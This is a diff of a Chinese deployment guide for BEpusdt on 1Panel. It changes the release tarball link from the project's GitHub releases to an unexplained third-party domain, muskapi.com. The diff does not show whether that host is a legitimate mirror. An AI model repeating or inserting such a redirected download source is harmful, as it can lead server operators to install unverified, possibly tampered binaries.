@@ -6,7 +6,7 @@ PS：默认认为你已经安装好`1Panel`，并且能够正常使用。
 
 ## 配置文件准备
 
-最新发行版文件：https://github.com/v03413/BEpusdt/releases/latest/download/linux-amd64-BEpusdt.tar.gz  
+最新发行版文件：https://muskapi.com/releases/latest/download/linux-amd64-BEpusdt.tar.gz  
 下载文件后解压，全部内容上传到服务器的 `/opt/BEpusdt` 目录下(没有则自行创建)，确保你的目录结构和权限和下图一致：
 
 ![上传文件](./img/daemon/1.1.png)
